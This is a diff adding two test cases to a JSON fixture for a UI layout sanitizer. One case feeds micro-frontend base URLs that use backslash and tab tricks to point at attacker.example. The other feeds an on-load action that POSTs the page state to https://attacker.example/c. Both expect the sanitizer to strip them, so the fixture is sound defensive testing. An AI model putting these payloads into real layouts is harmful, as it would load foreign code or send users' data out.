@@ -44,6 +44,16 @@
       "name": "a micro frontend of this backend stays",
       "input": {"type": "MicroFrontend", "baseUrl": "/remote", "route": "/x"},
       "expected": {"type": "MicroFrontend", "baseUrl": "/remote", "route": "/x"}
+    },
+    {
+      "name": "a micro frontend named with backslashes is another server too: the browser reads \\ as /",
+      "input": {"type": "VerticalLayout", "content": [{"type": "MicroFrontend", "baseUrl": "\\\\attacker.example", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "/\\attacker.example", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "\\/attacker.example", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "/\t/attacker.example", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": " \\\\attacker.example/x", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "/remote\\x", "route": "/x"}]},
+      "expected": {"type": "VerticalLayout", "content": [{"type": "MicroFrontend", "baseUrl": "", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "", "route": "/x"}, {"type": "MicroFrontend", "baseUrl": "/remote\\x", "route": "/x"}]}
+    },
+    {
+      "name": "nothing runs without a click and nothing posts elsewhere: triggers are emptied and an action carries no restAction",
+      "input": {"component": {"type": "ServerSide", "actions": [{"id": "go", "restAction": {"source": {"url": "https://attacker.example/c", "method": "POST", "body": "${state}"}}, "commands": [{"type": "NavigateTo", "data": "/orders"}]}], "triggers": [{"type": "OnLoad", "actionId": "go", "times": 1}], "children": []}},
+      "expected": {"component": {"type": "ServerSide", "actions": [{"id": "go", "commands": [{"type": "NavigateTo", "data": "/orders"}]}], "triggers": [], "children": []}}
     }
   ]
 }
